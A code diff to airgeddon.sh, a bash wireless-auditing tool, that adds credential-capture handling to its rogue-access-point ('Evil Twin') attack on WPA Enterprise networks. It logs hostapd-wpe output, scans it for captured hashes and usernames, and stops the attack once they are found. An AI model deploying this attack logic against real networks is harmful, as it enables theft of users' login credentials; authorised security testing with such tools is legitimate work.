@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20180819
+#Date.........: 20180820
 #Version......: 9.0
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
@@ -246,7 +246,8 @@ attemptsfile="ag.et_attempts.txt"
 currentpassfile="ag.et_currentpass.txt"
 et_successfile="ag.et_success.txt"
 enterprise_successfile="ag.enterprise_success.txt"
-processesfile="ag.et_processes.txt"
+et_processesfile="ag.et_processes.txt"
+enterprise_processesfile="ag.enterprise_processes.txt"
 channelfile="ag.et_channel.txt"
 possible_dhcp_leases_files=(
 								"/var/lib/dhcp/dhcpd.leases"
@@ -308,7 +309,6 @@ declare evil_twin_dos_hints=(267 268 509)
 declare beef_hints=(408)
 declare wps_hints=(342 343 344 356 369 390 490)
 declare wep_hints=(431 429 428 432 433)
-#TODO complete enterprise hints array
 declare enterprise_hints=(112 332 483 518)
 
 #Charset vars
@@ -4163,6 +4163,7 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}${sslstrip_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webserver_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${webdir}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
 	if [ "${dhcpd_path_changed}" -eq 1 ]; then
 		rm -rf "${dhcp_path}" > /dev/null 2>&1
 	fi
@@ -6172,6 +6173,7 @@ function exec_enterprise_attack() {
 	exec_et_deauth
 	set_enterprise_control_script
 	launch_enterprise_control_window
+	write_enterprise_processes
 
 	echo
 	language_strings "${language}" 524 "yellow"
@@ -6182,7 +6184,7 @@ function exec_enterprise_attack() {
 		recover_current_channel
 	fi
 	restore_et_interface
-	#TODO save stuff from tmpfiles to ${enterprise_completepath} if something was captured
+	#TODO save stuff from tmpfiles to ${enterprise_completepath} if something was captured (this is checked if file ${tmpdir}${enterprisedir}${enterprise_successfile} exists)
 	#TODO check if hash was captured to start asleap process after asking user
 	clean_tmpfiles
 }
@@ -6383,7 +6385,6 @@ function set_hostapd_wpe_config() {
 
 	tmpfiles_toclean=1
 	rm -rf "${tmpdir}${hostapd_wpe_file}" > /dev/null 2>&1
-	rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
 
 	different_mac_digit=$(tr -dc A-F0-9 < /dev/urandom | fold -w2 | head -n 100 | grep -v "${bssid:10:1}" | head -c 1)
 	et_bssid=${bssid::10}${different_mac_digit}${bssid:11:6}
@@ -6403,7 +6404,7 @@ function set_hostapd_wpe_config() {
 
 	{
 	echo -e "channel=${et_channel}"
-	echo -e "wpe_logfile=${tmpdir}${hostapd_wpe_log}"
+	echo -e "wpe_logfile=/dev/null"
 	echo -e "eap_server=1"
 	echo -e "eap_fast_a_id=101112131415161718191a1b1c1d1e1f"
 	echo -e "eap_fast_a_id_info=hostapd-wpe"
@@ -6447,11 +6448,16 @@ function launch_fake_ap() {
 
 	recalculate_windows_sizes
 	local command
+	local log_command
+
 	if [ -n "${enterprise_mode}" ]; then
+		rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
 		command="hostapd-wpe \"${tmpdir}${hostapd_wpe_file}\""
+		log_command=" | tee ${tmpdir}${hostapd_wpe_log}"
 		hostapd_scr_window_position=${g1_topleft_window}
 	else
 		command="hostapd \"${tmpdir}${hostapd_file}\""
+		log_command=""
 		case ${et_mode} in
 			"et_onlyap")
 				hostapd_scr_window_position=${g1_topleft_window}
@@ -6464,7 +6470,7 @@ function launch_fake_ap() {
 			;;
 		esac
 	fi
-	xterm -hold -bg black -fg green -geometry "${hostapd_scr_window_position}" -T "AP" -e "${command}" > /dev/null 2>&1 &
+	xterm -hold -bg black -fg green -geometry "${hostapd_scr_window_position}" -T "AP" -e "${command}${log_command}" > /dev/null 2>&1 &
 	et_processes+=($!)
 	sleep 3
 }
@@ -7122,6 +7128,8 @@ function set_enterprise_control_script() {
 	debug_print
 
 	rm -rf "${tmpdir}${control_enterprise_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${enterprisedir}" > /dev/null 2>&1
+	mkdir "${tmpdir}${enterprisedir}" > /dev/null 2>&1
 
 	exec 7>"${tmpdir}${control_enterprise_file}"
 
@@ -7135,6 +7143,35 @@ function set_enterprise_control_script() {
 	cat >&7 <<-EOF
 		#!/usr/bin/env bash
 		enterprise_heredoc_mode="${enterprise_mode}"
+		path_to_processes="${tmpdir}${enterprisedir}${enterprise_processesfile}"
+		wpe_logfile=${tmpdir}${hostapd_wpe_log}
+	EOF
+
+	cat >&7 <<-'EOF'
+		function kill_enterprise_windows() {
+
+			readarray -t ENTERPRISE_PROCESSES_TO_KILL < <(cat < "${path_to_processes}" 2> /dev/null)
+			for item in "${ENTERPRISE_PROCESSES_TO_KILL[@]}"; do
+				kill "${item}" &> /dev/null
+			done
+		}
+
+		function check_captured() {
+
+			readarray -t ENTERPRISE_LINES_TO_PARSE < <(cat < "${wpe_logfile}" 2> /dev/null)
+			for item in "${ENTERPRISE_LINES_TO_PARSE[@]}"; do
+				if [[ "${item}" =~ hashcat|username: ]]; then
+	EOF
+
+	#TODO improve this check_captured function to write on enterprise_successfile the type of the capture (0 if hash, 1 if clear, 2 if both)
+
+	cat >&7 <<-EOF
+					touch "${tmpdir}${enterprisedir}${enterprise_successfile}"
+					return 0
+				fi
+			done
+			return 1
+		}
 	EOF
 
 	cat >&7 <<-'EOF'
@@ -7164,10 +7201,11 @@ function set_enterprise_control_script() {
 			echo -e "\t${pink_color}${control_msg}${normal_color}\n"
 	EOF
 
-	#TODO parse hostapd-wpe output
-	#Create a success file ${tmpdir}${enterprisedir}${enterprise_successfile} always once a hash or a password is captured
-	#All temp files must be written to ${tmpdir}${enterprisedir}
-	#Stop attack if hash or password is captured on smooth mode otherwise don't do anything
+	cat >&7 <<-'EOF'
+			if check_captured && [ "${enterprise_heredoc_mode}" = "smooth" ]; then
+				kill_enterprise_windows
+			fi
+	EOF
 
 	cat >&7 <<-EOF
 			echo -ne "\033[K\033[u"
@@ -7198,7 +7236,7 @@ function set_et_control_script() {
 	EOF
 
 	cat >&7 <<-EOF
-			path_to_processes="${tmpdir}${webdir}${processesfile}"
+			path_to_processes="${tmpdir}${webdir}${et_processesfile}"
 			attempts_path="${tmpdir}${webdir}${attemptsfile}"
 			attempts_text="${blue_color}${et_misc_texts[${language},20]}:${normal_color}"
 			last_password_msg="${blue_color}${et_misc_texts[${language},21]}${normal_color}"
@@ -8156,7 +8194,17 @@ function write_et_processes() {
 	debug_print
 
 	for item in "${et_processes[@]}"; do
-		echo "${item}" >> "${tmpdir}${webdir}${processesfile}"
+		echo "${item}" >> "${tmpdir}${webdir}${et_processesfile}"
+	done
+}
+
+#Write on a file the id of the Enterprise Evil Twin attack processes
+function write_enterprise_processes() {
+
+	debug_print
+
+	for item in "${et_processes[@]}"; do
+		echo "${item}" >> "${tmpdir}${enterprisedir}${enterprise_processesfile}"
 	done
 }
 
